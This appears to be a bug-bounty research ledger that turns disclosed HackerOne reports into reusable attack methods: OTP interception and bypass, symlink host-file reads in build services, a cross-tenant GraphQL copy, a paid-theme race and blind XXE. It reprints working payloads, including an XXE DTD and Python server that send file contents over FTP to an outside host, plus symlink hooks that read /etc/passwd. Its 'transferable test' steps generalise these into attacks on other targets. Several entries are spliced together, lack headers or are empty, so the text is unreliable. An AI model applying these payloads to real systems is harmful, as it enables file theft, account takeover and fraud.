SOURCE: https://hackerone.com/reports/990048  2026-11-08
ROUTE: The H1 report BODY is `no-content` — confirmed this pass twice: `curl -H 'Accept: application/json' https://hackerone.com/reports/990048.json` -> HTTP 200 with `visibility: "no-content"` and `vulnerability_information` of length 0, and the Hugging Face disclosed-report dataset `elamaran619/hackerone_disclosed_reports` (test split, row id 990048) also carries `no-content` + 0 B. The vulnerable REQUEST and the PROGRAM's own explanation ARE public, in the report's PROGRAM SUMMARY: read this pass from the mirror `https://raw.githubusercontent.com/ajaysenr/HackerOne-Disclosed-Reports/main/reports/990048.md` (HTTP 200, 5,465 B), which reproduces the program summary verbatim, and INDEPENDENTLY CORROBORATED by the dayzerosec podcast episode 89 write-up (`https://dayzerosec.com/podcast/89.html`, fetched this pass: "[Zomato] Improper Validation at Partners Login / Only the phone number parameter was being validated. So an attacker could maliciously modify the country code … the SMS provider supported having multiple phone numbers separated by a `,`"). Metadata (H1 JSON + mirror): Eternal / Zomato, asset `*.zomato.com` (WILDCARD, max_severity **critical**), weakness "Improper Authentication - Generic", **Critical**, $2,000, 250 votes, reporter ashoka_rao, submitted 2020-09-24, disclosed 2021-10-06.
STATUS: UNVERIFIED (not reproduced) — no SMS gateway and no Zomato partner flow were exercised this pass; the request and the explanation below are quoted verbatim from the public program summary.
CLASS: authentication bypass / OTP interception — untrusted OTP DELIVERY-ADDRESS injection: an unvalidated sibling parameter is CONCATENATED into the destination string handed to an SMS gateway that accepts a separator-delimited RECIPIENT LIST, so the one-time code is delivered to the attacker's handset as well as the victim's.
CORE METHOD:
  1. The OTP-send endpoint (partner login), verbatim program summary: `POST /merchant-api/dining/merchant-login/v1/send-otp HTTP/1.1` / `Host: www.zomato.com` / `Content-Type: application/json` / `x-zomato-csrft: CSRF` / `x-zomato-app-version: 2` / `Origin: https://www.zomato.com` / `Referer: https://www.zomato.com/partners` — body `{"res_id":"XXXXXXXX","country_isd":"918888888888,","phone_number":"XXXXXXXXXX"}`.
  2. Only ONE field was validated: "There were no strict checks on `country_isd`."
  3. The backend ASSEMBLED the destination: "Our backend generated the OTP for `phone_number` param but appended the `country_isd` parameter to the `phone_number` param before sending the SMS without any major checks."
  4. The gateway accepted a LIST: "Our SMS provider supports multiple phone numbers separated by spaces" — the assembled destination becomes `918888888888,XXXXXXXXXX`, attacker's number first, victim's number appended.
  5. Outcome, verbatim: "Here the reporter was able to demonstrate an attack to get the OTP of the victim on both the attacker's number and the victim's number." The attacker therefore holds a code the victim's own account will accept.
DETECTION SIGNAL: any OTP/verification SEND endpoint whose destination is assembled from MORE THAN ONE client-supplied field (`country_isd`, `isdCode`, `dialCode`, `countryCode`, `phone_code`, `prefix`, `extension`) where only one of them is validated; a field that ends up concatenated into a string handed to an outbound SMS/email gateway; a gateway/provider that accepts a recipient LIST (separators `,`, space, `;`, `|`, `%0a`). WAF tell: recipient-side validation is absent while the visible `phone_number` is strictly checked. Second tell: the request still returns success with no validation error on the injected separator.
CHAIN: attacker reaches the partner OTP-send endpoint (primitive: OTP request is unauthenticated/low-priv) -> the destination is built by concatenating the validated phone number with an unvalidated attacker-controlled sibling field (primitive: SPLIT validation of an ASSEMBLED string) -> the SMS gateway parses the injected separator as a recipient delimiter and delivers the SAME code to the attacker's number (primitive: OTP exfiltration / second-recipient injection) -> the attacker completes the victim/partner login with a code the victim never sees = account takeover (asset rated critical; 9.8-class).
TRANSFERABLE TEST: on every OTP send/resend endpoint, (1) enumerate the sibling fields in the SAME request that join the destination (`country_isd`, `isdCode`, `dialCode`, `phone_code`, `prefix`, `extension`); (2) point `phone_number` at YOUR OWN account as the control, then append a separator plus your number to the sibling field — `,+1<yournumber>` / ` <yournumber>` / `;<yournumber>` / `|` / `%0a`; (3) if the code arrives on BOTH handsets the field is unvalidated and the gateway accepts a recipient list; (4) repeat with the sibling field carrying ONLY your number to test full re-addressing. Rule: **validate the ASSEMBLED destination, not each field — an OTP addressed from more than one client field can be re-addressed to the attacker whenever the gateway accepts a multi-recipient string, and the code only needs to reach one extra handset to be a full ATO.**
DEDUPE/DELTA: 0 hits across all three write targets for `990048`, `country_isd`, `send-otp`, `merchant-login`, `ashoka_rao`, `dayzerosec`. Every OTP entry already recorded attacks the VERIFY step (V-07 response manipulation / `code=null` fail-open; the two-step claim flow whose verify is not bound to the issue-time resource id; the #665722 MFA factor relabel; the short-code brute-force oracle) — none ADDRESSES the code. This is the first recorded case where the primitive is the DELIVERY CHANNEL and the OTP is STOLEN rather than bypassed => new general method, §17.196 in /root/Bugbountyskills.md.

SOURCE: https://hackerone.com/reports/2588329  2026-11-08
ROUTE: `visibility: full` — whole body read this pass TWICE: `curl -H 'Accept: application/json' https://hackerone.com/reports/2588329.json` (HTTP 200, 5,126 B, `visibility: "full"`, `vulnerability_information` 924 B) and the mirror `https://raw.githubusercontent.com/ajaysenr/HackerOne-Disclosed-Reports/main/reports/2588329.md` (HTTP 200, byte-consistent narrative). Metadata: inDrive, asset `*.indriverapp.com` (WILDCARD), weakness "Business Logic Errors", **Critical — CVSS 9.8** (`attack_vector: network, attack_complexity: low, privileges_required: none, user_interaction: none, scope: unchanged, C/I/A: high`), $2,000, reporter polem4rch, submitted 2024-07-07, disclosed 2024-10-09.
STATUS: UNVERIFIED (not reproduced) — no inDrive app/session was used this pass; steps and quotes are verbatim from the report.
CLASS: business logic / authentication bypass — the PHONE-NUMBER-CHANGE flow accepts a FIXED, well-known OTP value (`0000`), so the change is not a proof-of-possession of the new number and ANY number can be bound to the account.
CORE METHOD:
  1. In-app, verbatim steps: "1. Click setting in the account  2. Click into the phone number and change for a new one  3. Input 0000 as the otp code" → "Phone number added!!".
  2. The flaw stated by the reporter: "it will send a 4 digit code but if you place 0000, it will accept any number and update it into the app!!"
  3. The new number is never proven to be the attacker's: "At the end you can see i was trying to pick a number from my contacts but instead i just use a random phone number and works!!" — i.e. an arbitrary number (including a third party's) is bound.
  4. Reporter's impact line, verbatim: "Any attacker can use the phone number for an account takeover or delete anyone account, or cancelling trips"; his remediation: "Make sure the otp doesnt accept 0000 or other invalid codes".
DETECTION SIGNAL: a verification step (phone change, e-mail change, MFA enrol, account-recovery factor change) whose submitted code is compared LOOSELY (equality/truthiness) instead of against a server-side PENDING CHALLENGE bound to (account, factor, destination); the tell is that a degenerate value passes — `0000`, `1234`, `1111`, `000000`, `123456`, `999999`, empty string, `null`, or a value derived from the destination itself — and that the SAME value works on every account (prove it on two of your own). Companion tell: no pending-challenge identifier in the request, fixed short code length, no lockout.
CHAIN: attacker with an ordinary account (primitive: self-service phone-number change exposed in settings) -> submits `0000` at the OTP step, which the server accepts with no real challenge object (primitive: OTP verification is a FORMAT check, not a possession check) -> an arbitrary/third-party number is bound to the account without proving possession (primitive: the account identity factor is replaced unchecked) -> reporter-stated outcomes: account takeover, deletion of another user's account, cancellation of trips (business logic with account/monetary impact; triaged Critical 9.8, $2,000). Per doctrine §8 the report does not document the exact victim-binding sequence, so the "any phone number takeover" is recorded as the REPORTER'S stated impact, not as a step-by-step chain reproduced here.
TRANSFERABLE TEST: at every code-entry step of a SENSITIVE factor change, (1) submit the degenerate set `0000`, `1234`, `1111`, `000000`, `123456`, `999999`, `""`, `null`; (2) submit the destination's own digits (last 4 of the NEW number); (3) replay a code that was valid for a DIFFERENT account/flow; (4) confirm the SAME value passes on two of your own accounts — a static-OTP acceptance is server-wide, not per-account. CLASS: sandbox/container escape -> arbitrary HOST file read — a symlink shipped as a plain source-tree file, dereferenced by the platform's own post-build FILE VIEWER because the name it was given is the RESERVED TWIN the platform's config parser *skips* while the file server still *serves* it.
CORE METHOD:
  1. Submit a project the build service builds successfully (reporter's own: `https://github.com/testanull/test11`).
  2. Put a VALID config in the repo under the name the platform processes: `lgtm.yml` — verbatim content `extraction:\n  java:\n    index:\n      build_command:\n      - ./custom-build`.
  3. Add a SECOND file whose name is the platform's other reserved spelling — `.lgtm.yml` — but make it a SYMLINK pointing at a HOST MACHINE file/directory. Verbatim: "Make a symlink point to a HOST MACHINE file/directory with name: ``.lgtm.yml``".
  4. After the build, open the post-build file listing/viewer: "After successful build, ``.lgtm.yml`` file will contain the host machine file content!" — the PoC attached to the report reads `/etc/passwd`.
  5. Why the guard missed it, verbatim: "By default, only source code files and build config files are reserved (``lgtm.yml`` and ``.lgtm.yml``). If there are both files in folder, LGTM will process ``lgtm.yml`` file and skip ``.lgtm.yml``, but it still keeps both of files in directory." The name-based rule protected the file from the PARSE path only.
DETECTION SIGNAL: any build/scan/convert service that (a) materialises symlinks from the submitted tree (repo checkout or archive extraction) and (b) later READS or SERVES a user-named file back to the submitter (file list after build, artifact browser, "view extracted files", diff/preview panes). The precise tell is a RESERVED-NAME PAIR: the platform parses one spelling of its config (`lgtm.yml`) while only *keeping* — and serving — its twin (`.lgtm.yml`, the dot-prefixed/hidden variant); a dot-ignoring engine (`Dir.glob`/`**/*` that includes dotfiles, or a viewer that lists them) is what turns "kept" into "read".
CHAIN: ordinary low-privilege user submits a repo (primitive: source tree is attacker-controlled, symlinks permitted) -> the symlink survives materialisation into the build sandbox (primitive: no symlink rejection on the source-tree path) -> the platform's own post-build file viewer dereferences the IGNORED twin name `.lgtm.yml` (primitive: deny-list covers the parsed name, not the served one) -> arbitrary read of HOST-machine files (`/etc/passwd` proven by PoC) = escape from the per-build container into the host filesystem; reporter's impact line: "Give attacker ability to explore the host machine, expose more sensitive informations from it." Triaged Critical 9.3, $2,000. The "[again]" title marks the incomplete-fix cycle: the same class returned after the first patch.
TRANSFERABLE TEST: in any CI/build/scan/convert service that shows your files back to you: (1) ship a tree (tar, zip or plain repo) containing an entry that is a SYMLINK to `/etc/passwd` and one to the platform's own config/secret path; (2) name that entry the RESERVED/IGNORED SPELLING of the service's config file — the dotted/hidden twin (`.lgtm.yml`) or whichever spelling the parser SKIPS — while a valid config keeps the build green; (3) fetch the post-build file view of that path. If the target file's content comes back, the serving path follows symlinks. Rule: **a filename the PARSER ignores is still a filename the FILE SERVER will read — test every reserved config name in its ignored spelling, and re-test after a fix, because a deny-list on the processed spelling leaves the twin reachable (that is what the "[again]" in this report's title is).**
DEDUPE: 0 hits across all three write targets for `697055`, `lgtm`, `lgtm.yml`, `semmle`, `testanull`. The file's existing symlink material (15 hits) is the ARCHIVE-upload family — GitLab bulk-import `uploads.tar.gz` whose entries are symlinks, followed at `load` by `UploadService.new(..., File.open(file_path,'r'), ...)` -> arbitrary read as `git` -> `secrets.yml` -> Critical 9.6, $29,000 — i.e. symlinks smuggled inside an UPLOADED ARCHIVE and dereferenced by an IMPORT/extraction loader, with the trigger being the import action. DELTA recorded here: (a) the symlink arrives as a plain REPO FILE — no archive upload, no import feature, the build itself is the trigger; (b) the dereference is performed by the service's OWN POST-BUILD FILE VIEWER, not by a loader that stores the object; (c) the selection trick (the reserved-but-ignored name) and the incomplete-fix cycle are new. New general method -> §17.197.

STATUS: UNVERIFIED (not reproduced) — no Shopify store pair was created this pass; request, mutation and variables are verbatim from the report.
CLASS: broken access control (BFLA / BOLA) on an UNDOCUMENTED INTERNAL GraphQL mutation — cross-tenant object copy via a raw storage key, used to bypass a role's missing upload permission.
CORE METHOD:
  1. Situation: attacker holds a staff account on `storeA.myshopify.com` with NO file permissions ("wants to upload a file on the store but could not, due to permissions restrictions").
  2. IDENTIFIER-GENESIS STEP: create a second store you legitimately control — `storeB.myshopify.com` — and upload a file there, so you own a well-formed storage identifier.
  3. Capture the three values the storage layer uses, verbatim from the request: `"absoluteKey": "s/files/1/d/0864/0471/6006/6199/files/1.jpg"`, `"key": "files/1.jpg"`, `"path": "https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"`.
  4. Log into `storeA` (as the low-priv staff) and call the UNDOCUMENTED mutation on the INTERNAL admin GraphQL endpoint, verbatim: `POST /admin/internal/web/graphql/core HTTP/1.1` with `accept: application/json`, `X-CSRF-Token: [REDACTED]`, `Content-Type: application/json`, body `{"query":"\r\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\r\nfile{\r\n    \r\n    path\r\n}\r\n userErrors {\r\n    field\r\n    message\r\n}\r\n    }\r\n}","variables":{"absoluteKey":"s/files/1/d/0864/0471/6006/6199/files/1.jpg","key":"files/1.jpg","path":"https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"}}`.
  5. The mutation accepts the raw storage key in the CURRENT store's authenticated context and copies the object in, with no store-ownership check and no upload permission required.
DETECTION SIGNAL: an INTERNAL admin GraphQL route (`/admin/internal/web/graphql/core`, `/internal/graphql`, `/admin/graphql/internal`) reachable with the same session cookie as the normal admin UI but NOT documented in the API contract; mutations whose arguments are RAW STORAGE IDENTIFIERS (`absoluteKey`, `key`, `path`, `*Key`, `*Bucket`, `objectKey`, S3/GCS paths, CDN URLs) rather than tenant-scoped ids; any mutation where the object's owner is derived from the CALLER-SUPPLIED key instead of from the session. Companion tells: the low-priv role cannot perform the equivalent action in the UI, yet the mutation returns without `userErrors`; the returned `file{path}` points at content whose key prefix belongs to a different store.
CHAIN: low-priv staff (no file permission) -> provisions a second store and uploads a file there to MINT a valid `absoluteKey`/`key`/`path` triple (primitive: identifier genesis in a tenant you own) -> replays that triple against the TARGET store's undocumented `fileCopy` mutation on `/admin/internal/web/graphql/core` (primitive: mutation authorises the session but not the OBJECT) -> the asset is copied into the current store without the permission the role lacks, i.e. the missing upload permission is bypassed and foreign-store file assets become accessible (reporter's stated impact, verbatim: "A malicious staff account with no permissions can copy other store file assets to current store, which they have no access to") -> triaged Medium 4.2, $2,000. Honest scope note: the pictured demonstration copies a file the reporter had uploaded to his OWN second store; the cross-tenant read against a third party's asset is the reporter's stated impact, not a pictured victim.
TRANSFERABLE TEST: (1) locate the internal GraphQL route: grep the admin JS bundle / HAR for `/graphql` paths and diff them against the documented API path (`/admin/api/*`); (2) introspect it and list EVERY mutation, then filter for those taking a storage identifier; (3) mint a legitimate identifier in a SECOND tenant you own (this guarantees a well-formed value and a known-good control); (4) call the mutation from the WEAKEST role you have, passing YOUR key first (control), then a key belonging to the victim tenant / a neighbouring path or numeric variant of yours, and diff the returned `path` and the resulting object listing. Rule: **storage keys are global while permissions are tenant-scoped — every mutation that takes a raw object key (`absoluteKey`/`key`/`path`) must be replayed cross-tenant from a low-privilege session, and you should always mint your identifiers inside a tenant you own so you have a valid-looking value that no format check will reject.** NO §17 duplicate: the file's BAC/BOLA material keys on tenant-scoped ids/URLs; the raw-storage-key copy, the internal-vs-documented GraphQL split and the second-tenant identifier genesis are new -> §17.198.

CORE METHOD:

Scope caveat: "Other Payment methods and consumers including online ordering were not vulnerable to this."

CHAIN: attacker creates an order for the value they want credited (normal endpoint) -> the capture call takes the paid amount as an independent client parameter -> the full ordered amount is credited for an arbitrary smaller payment -> direct monetary loss per transaction, repeatable up to the 10K INR ceiling (High 7.5, $2,000). Doctrine §4 "business logic -> monetary loss at scale".

Rule: **in a two-step money flow the value must be READ BACK from the stored order at capture; if the second request can restate the amount, the only question is which copy the server believes.**

ROUTE: `visibility: "full"` — whole body read live this pass via `curl -H 'Accept: application/json' https://hackerone.com/reports/694181.json` -> HTTP 200, 6,583 B, `vulnerability_information` 888 B, and independently present in the LOCAL disclosed-report dataset `/tmp/h1_train.parquet` (row id 694181, same 888 B). Metadata (H1 JSON): Semmle, asset LGTM (whitebox build service), weakness "Privilege Escalation", **Critical**, $2,000, reporter testanull, submitted 2019-09-13, disclosed 2019-10-16.
STATUS: UNVERIFIED (not reproduced) — no LGTM/Semmle build service was stood up this pass; the YAML block and the host-copy sentence are quoted verbatim from the report.
CLASS: sandbox/container escape -> arbitrary HOST file read — a file INSIDE the per-job build container is replaced by a SYMLINK to a host path, and the orchestrator's POST-JOB COPY-OUT of that file dereferences the link in the HOST's filesystem namespace instead of the container's.
CORE METHOD:
  1. The build config exposes a hook that runs arbitrary commands inside the whitebox job container — here the LGTM config key `extraction: cpp: after_prepare:` (`lgtm.yml`).
  2. Verbatim payload (the report's own steps-to-reproduce):
     ```yaml
     extraction:
       cpp:
         after_prepare:
           - rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
     ```
  3. Delete the file the platform will ARCHIVE / COPY OUT after the job finishes (`/opt/out/snapshot/log/build.log`, the build log) and replace it with a symlink to a host-side target (`/etc/passwd` in the PoC).
  4. Let the job finish. The report's summary, verbatim: "After finishing job, host machine copy file from docker container. Because the original log file has been removed, the host machine will copy the symlink file. But the problem is it doesn't copy the linked file in container, it copys the linked file in the HOST MACHINE."
  5. Read the archived log back through the platform UI -> you receive the HOST machine's `/etc/passwd` (content attached in the report). Reporter's impact line: "Give attacker ability to explore the host machine, expose more sensitive informations from it."
DETECTION SIGNAL: a CI/build/scan/convert service that (a) runs your config-supplied pre/post commands inside a per-job container AND (b) afterwards PULLS artifacts or logs OUT of that container (build-log archive, coverage/report file, artifact download, post-build file listing) — the tell is any path the PLATFORM ITSELF will copy, and a LOG file is the softest target because it always exists. Config keys named `after_prepare`, `before_*`, `setup`, `hooks`, `commands`/`script` are the command-execution surface; the copy-out step is the host-read surface.
CHAIN: low-privilege user submits a project whose build config contains a hook (primitive: config hook executes in-container) -> deletes-and-replaces the to-be-copied-out log with a symlink to a host path (primitive: container-writable file that the host will copy) -> the host's own copy-out resolves the symlink ON THE HOST (primitive: symlink dereference in the wrong namespace) -> arbitrary read of HOST files (recon -> host config/credentials) = escape from the per-build container onto the host filesystem (triage: Critical, $2,000).
TRANSFERABLE TEST: for any build/convert/scan service, find a file the platform copies OUT of the job sandbox (its build log, a report, an artifact path), then from an in-container hook `rm` that path and `ln -s /etc/passwd <that path>`; fetch the archived copy and determine WHICH filesystem it came from — a host path proves the copy-out resolves symlinks host-side. Rule: **any file the orchestrator PULLS OUT of your container is a host-file-read primitive once you can make it a symlink; test the copy-out, not just the upload.**
DEDUPE: 0 hits across all three write targets for `694181`, `after_prepare`, `build.log`, `/opt/out/snapshot`, `extraction:`. Related-but-distinct pre-existing material REVIEWED and NOT re-recorded: §17.197 / harvest ledger ~line 6313 (Semmle LGTM **#697055**, same researcher/program but a DIFFERENT mechanism — there the symlink is an ordinary REPO FILE named as the RESERVED spelling the config parser SKIPS (`.lgtm.yml` beside a valid `lgtm.yml`) and it is dereferenced by the platform's POST-BUILD FILE VIEWER; the deltas vs #694181 are the entry point (repo tree / file viewer vs build config hook / host copy-out) and the target file (served artifact vs archived log)); and the GitLab bulk-import tar-symlink family (harvest ledger ~line 2180 — a symlink inside an UPLOADED ARCHIVE, dereferenced by the import LOADER at `load`, read-as-`git` -> `secret_key_base`). #694181 is the ancestor of §17.197 with its own entry point. New general method -> §17.202.

SOURCE: https://hackerone.com/reports/953083  2026-11-08
ROUTE: `visibility: "full"` — body read live via `.json` -> HTTP 200, 7,582 B, `vulnerability_information` 4,241 B; also present in the LOCAL dataset `/tmp/h1_train.parquet` (row id 953083, same 4,241 B). Metadata (H1 JSON): Shopify, "Ability to publish a paid theme without purchasing it.", weakness "Improper Access Control - Generic", **Low** (team-rated), $2,000, reporter saltymermaid, submitted 2020-08-07, disclosed 2020-08-27.
STATUS: UNVERIFIED (not reproduced) — no Shopify store or theme install was exercised this pass; the `fetch` body and the numbered steps are quoted from the report.
CLASS: business logic / broken access control — a TOCTOU race on a PAID resource: the entitlement/purchase gate is attached to the object only when its INSTALLATION COMPLETES, so a state-changing mutation (publish) fired against the object while it is still in the intermediate "installing" state acts on an object that has no purchase record yet.
CORE METHOD:
  1. Establish the control on a store you own: install + publish a FREE theme, then copy the `ThemePublishLegacy` XHR out of DevTools as `fetch` — endpoint `POST https://<shop>.myshopify.com/admin/online-store/admin/api/unversioned/graphql` with headers `x-online-store-web: 1`, `content-type: application/json`, `accept: application/json`, `credentials: include` and body (report verbatim, `[THEME_ID]` is the placeholder):
     ```
     {"operationName":"ThemePublishLegacy","variables":{"id":"gid://shopify/OnlineStoreTheme/[THEME_ID]"},"query":"mutation ThemePublishLegacy($id: ID!) {\n  onlineStoreThemePublish(id: $id) {\n    theme { id __typename }\n    userErrors { field message __typename }\n    __typename\n  }\n}\n"}
     ```
  2. In a second tab go to `https://themes.shopify.com/`, pick any PAID theme and click "Try theme" to start its installation; keep the store's `admin/themes` tab open and reload it while the install is running (a spinner shows the theme "being installed").
  3. From the install's OWN GraphQL response (`ThemesProcessingLegacy`) read the id of the theme currently installing: `data > onlineStore > themes > edges > [0] > node > id` — "The ID of the theme being installed is the one at the first index".
  4. Replay the saved `ThemePublishLegacy` request with that in-flight id ("**before the theme installation is complete!**"). Timing matters — report verbatim: "It seems like for this to work properly, the `ThemePublishLegacy` request should be sent right before the installation is complete, just before the last `ThemesProcessingLegacy` request is made." Early attempts fail inside the window with `Role can't be set to main: missing required file layout/theme.liquid`.
  5. After the install completes the PAID theme is published. It then behaves as OWNED: the yellow "Theme trial" badge is gone and you can rename, edit and download the theme files — "we own it".
DETECTION SIGNAL: any multi-step purchase/install/import flow where the new resource EXISTS in an intermediate state (installing / processing / uploading / pending) with a CLIENT-VISIBLE identifier BEFORE the entitlement/ownership record is written; a GraphQL/REST processing response that already leaks the new object's id; a publish/activate/enable/download mutation whose authorization depends on an entitlement attached only at the END of the flow. The tell: the same mutation succeeds against a finished FREE object as the control but the PAID object is only attackable during the window.
CHAIN: attacker with an ordinary account (primitive: a normal user can start a paid-theme install) -> harvests the in-flight theme id from the install's own processing response (primitive: id visible before entitlement exists) -> replays the publish mutation inside the install window (primitive: the publish path runs against an object with no purchase record) -> the paid theme is published and becomes editable/downloadable (primitive: ownership granted without payment) -> content theft / lost profit (the reporter's stated impact: "Ability to install paid theme without purchasing it could lead to content stealing and lost of profit"; team-rated Low, $2,000).
TRANSFERABLE TEST: on any paid/metered install or provisioning flow, first capture the state-changing mutation (publish/activate/enable/download/claim) for a FREE item as the control; then START the paid item's install and replay that same mutation against the in-flight object id (read it from the processing/progress response or an object listing) just before completion. If the paid object ends up activated/owned, the entitlement is applied AFTER the action was accepted. Rule: **the window between "the object exists" and "the object is billed" is the race target — watch the processing/progress responses for the id and fire the privileged mutation inside that window; automate the timing because it is only a few seconds wide.**
DEDUPE: 0 hits across all three write targets for `953083`, `927567`, `ThemePublishLegacy`, `onlineStoreThemePublish`, `ThemesProcessingLegacy`, `unversioned/graphql`, `Theme trial`, `testbuguser`. Related-but-distinct pre-existing material REVIEWED and NOT re-recorded: the recorded `TOCTOU` entries (async-export re-auth; DNS resolve-then-fetch; BD-J path interpretation; the privileged-helper signature-check-then-launch symlink swap) — none is an ENTITLEMENT/purchase gate applied after an install completes; the Shopify theme-preview entry (harvest ledger ~line 4738, `GET /preview_bar` serving gated content unauthenticated) — a different primitive (missing auth on a preview path, not a race on a purchase gate); §17.89 (server-owned lifecycle STATE fields writable to skip a payment gate) — that is a mass-assignment/state-field write, not a timing window. New general method -> §17.203.

SOURCE: https://hackerone.com/reports/334488  2026-11-08
ROUTE: report BODY not retrievable on any primary route this pass — live `curl -H 'Accept: application/json' https://hackerone.com/reports/334488.json` -> HTTP 404 (multiple attempts, different User-Agents, while sibling reports in this same batch return 200); anonymous `POST https://hackerone.com/graphql {report(id:334488){…}}` -> `{"message":"Report does not exist"}` (NOT_FOUND); the report page -> Cloudflare "Performing security verification" interstitial -> `/users/sign_in` (web_extract, the browser tool and `https://r.jina.ai/<url>` all blocked); mirror `raw.githubusercontent.com/ajaysenr/HackerOne-Disclosed-Reports/main/reports/334488.md` -> HTTP 404 (14 B); the report is absent from the local Hugging Face disclosed-report splits (no row in /tmp/h1_train.parquet / h1_test.parquet); `r.jina.ai` against `web.archive.org` was refused HTTP 403 (abuse block from this egress). What DID render: the Wayback CDX index (20+ HTML-200 captures 2018-07-23 … 2022-11-30) and, extracted from those captures, the page `<meta property="og:description">` / `<meta name="description">` ONLY — which carries the REPORTER'S OWN Summary verbatim: "## Summary During the parsing of Powerpoint files it seems that it is possible to include XXE payload which will be executed on the Open-XChange server. I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible to read arbitrary files from the server as described here:...". The concrete PAYLOAD, the DTD and the OOB exfil code were read this pass from the CREDITED PUBLIC WRITEUP `https://evanluke.gitbook.io/appsec/xxe/xml-external-entity-xxe/xxe-examples` (section "Open-Xchange (Powerpoint parser XXE)", which links exactly this report URL and reproduces its payloads and Python DTD/exfil server — all payloads below are verbatim from that page). Metadata (report page + public indexes): Open-Xchange, "Blind XXE via Powerpoint files", $2,000, 82 upvotes; XXE class.
STATUS: UNVERIFIED (not reproduced) — no Open-Xchange instance or document parser was deployed; the payloads and DTD/exfil code are quoted from the credited writeup, the summary sentence is the reporter's own.
CLASS: XXE (blind / out-of-band) in a SERVER-SIDE OOXML document parser — an external entity declared inside ONE XML part of a `.pptx` package is resolved by the backend when the document is parsed, and because the response is blind the chain uses a two-stage OOB mechanism: an HTTP-fetched external DTD whose nested parameter entity embeds a local file into an FTP URL.
CORE METHOD:
  1. Build a benign `.pptx`, open the OOXML package as a ZIP (WinRAR/`unzip`) and locate the XML part the converter parses — `tableStyles.xml`. Its clean content, verbatim from the writeup:
     ```
     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
     <a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}"/>
     ```
  2. Inject a DOCTYPE with a two-stage parameter-entity payload into that part and re-zip. Writeup payload, verbatim (attacker host = `54.227.205.198:443`):
     ```
     <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
     <!DOCTYPE a:tblStyleLst [<!ELEMENT a:tblStyleLst ANY ><!ENTITY % sp SYSTEM "http://54.227.205.198:443/">%sp;%param1;]>
     <a:tblStyleLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" def="{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}">&exfil;</a:tblStyleLst>
     ```
     `%sp` fetches the external DTD over HTTP; `%param1` is the entity that DTD will define; `&exfil;` in the body is the trigger.
  3. On the attacker host run a tiny HTTP server that answers the DTD request with the nested-entity definition (writeup's Python, verbatim):
     ```
     dtd = '''<!ENTITY % data SYSTEM "file:///etc/hostname">
     <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://{HOST}:{PORT}/%data;'>">'''.format(HOST, PORT)
     ...
     conn.sendall('HTTP/1.1 200 OK\r\nContent-length: {len}\r\n\r\n{dtd}'.format(len=len(dtd), dtd=dtd))
     ```
     `%data` reads the local file; `%param1` declares `exfil` as an FTP URL whose PATH CONTAINS `%data;` — i.e. the file's contents become part of the URL.
  4. Run an FTP listener on the same host; when the parser resolves `&exfil;` it builds `ftp://<attacker>:<port>/<file-contents>` and connects out — the FTP server simply reads the login/path line, which carries the file's bytes.
  5. Upload the package: "With the python code running on the attacker controlled server, the malicious powerpoint file is uploaded to the Open-Xchange server … the backend server [parses] the powerpoint file processing the tableStyles.xml file therein, then issue an HTTP request to retrieve the DTD, process it and exfiltrate the /etc/hostname file via FTP to the attacker controlled server." The exfiltrated value was `sandbox-1` (the server's hostname); the reporter states arbitrary file read is possible.
DETECTION SIGNAL: a server-side DOCUMENT CONVERTER / thumbnailer / previewer / indexer that parses OOXML (`.pptx`/`.docx`/`.xlsx`) or ODF (`.odt`/`.ods`) input — every XML part inside the zip is a parser-reachable sink, and the file type is content-sniffed not extension-trusted. The tell: an outbound HTTP request to your listener when the file is uploaded/AUTO-PARSED, or (when the response is not reflected) an FTP/DNS callback. A docs/office/email app that "processes" attachments server-side (Open-Xchange, and peers) is the archetype.
CHAIN: anyone who can upload/send a document (primitive: attacker controls an OOXML part inside a zip) -> the server's parser processes the external entity (primitive: DTD/entity resolution enabled on the converter) -> the external DTD is fetched over HTTP (primitive: OOB fetch with no reflected response) -> the DTD's nested parameter entity reads a local file and embeds it in an FTP URI (primitive: `%data;` from `file:///`) -> the parser connects out to the attacker's FTP (primitive: OOB exfil) -> arbitrary server-side file read delivered to the attacker host (report proved `/etc/hostname`; arbitrary files per the reporter) = internal file read / SSRF-capable XXE on the document-processing backend.
TRANSFERABLE TEST: take any `.pptx` (or `.docx`/`.xlsx`/`.odt`), unzip it, replace one XML part with the injected `tableStyles.xml` above (pointing `%sp` at your own host), serve the two-stage DTD and open an FTP (or `ftp://`-logging / DNS-logging) listener, then upload the file to the target's import / preview / convert / attach feature and watch for the HTTP hit followed by the FTP connection whose path carries the target's file bytes. If only one protocol is allowed out, keep the entity (file content) and switch the exfil URL scheme (DNS, HTTP path, SMB UNC). Rule: **every OOXML/ODF part is an XML parser you can reach with an upload; when the response is blind, an OOB DTD (HTTP fetch -> nested `%param1` entity -> FTP/DNS URI carrying the file) is the standard way to read the file off the box.**
DEDUPE: 0 hits across all three write targets for `334488`, `tableStyles`, `tblStyleLst`, `Powerpoint`, `PowerPoint`, `54.227.205.198`, `param1`, `a:tblStyleLst`. Related-but-distinct pre-existing material REVIEWED and NOT re-recorded: the recorded Open/LibreOffice document-conversion SSRF entry (harvest ledger ~line 4326, Slack ODS → `_converted.pdf` preview; SSRF via document EXTERNAL LINKS / OLE, not external XML ENTITIES — different primitive and different exfil); the recorded Shopify SVG XML-entity whitelist bypass (stored admin XSS, different parser/sink); and the `unserialize to XXE` Pornhub item (recorded as unreadable). New general method -> §17.204.

SOURCE: https://hackerone.com/reports/2930811  2026-11-08
ROUTE: `visibility: "full"` — body read live via `.json` -> HTTP 200, 4,861 B, `vulnerability_information` 1,780 B. Metadata (H1 JSON): Cosmos, "Attacker can use any non-enabled capability", weakness "Privilege Escalation", **Low** (team-rated), $2,000, reporter julianor, submitted 2025-01-10, disclosed 2025-01-15. (Absent from the local HF disclosed-report splits — a 2025 disclosure, outside that dump.)
